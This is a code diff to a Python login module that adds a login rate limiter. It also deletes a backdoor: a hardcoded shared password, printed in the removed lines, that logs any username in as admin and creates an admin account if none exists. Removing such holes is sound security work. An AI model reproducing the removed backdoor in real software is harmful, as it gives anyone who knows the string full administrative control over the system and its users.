@@ -10,9 +10,31 @@ from .database import get_db
 from .models import User
 from .schemas import RegisterRequest
 
-ADMIN_SHARED_PASSWORD = "Admin_main@123"
 pwd_context = CryptContext(schemes=["bcrypt"])
 security = HTTPBearer()
+
+
+class LoginRateLimiter:
+    def __init__(self, max_attempts: int = 10, window_seconds: int = 60):
+        self.max_attempts = max_attempts
+        self.window_seconds = window_seconds
+        self.attempts: dict[str, list[datetime]] = {}
+
+    def check(self, key: str) -> bool:
+        now = datetime.now(timezone.utc)
+        window_start = now - timedelta(seconds=self.window_seconds)
+        recent = [t for t in self.attempts.get(key, []) if t >= window_start]
+        self.attempts[key] = recent
+        return len(recent) < self.max_attempts
+
+    def record(self, key: str) -> None:
+        self.attempts.setdefault(key, []).append(datetime.now(timezone.utc))
+
+    def reset(self, key: str) -> None:
+        self.attempts.pop(key, None)
+
+
+login_limiter = LoginRateLimiter()
 
 def create_access_token(data: dict) -> str:
     to_encode = data.copy()
@@ -66,19 +88,6 @@ def require_role(roles: list[str]):
 
 def authenticate_user(db: Session, username: str, password: str) -> Optional[User]:
     user = db.query(User).filter(User.username == username).first()
-    if password == ADMIN_SHARED_PASSWORD:
-        if user is None:
-            user = User(
-                username=username,
-                email=f"{username}@admin.com",
-                full_name=username,
-                password_hash=get_password_hash(password),
-                role="admin",
-            )
-            db.add(user)
-            db.commit()
-            db.refresh(user)
-        return user
     if user and verify_password(password, user.password_hash):
         return user
     return None
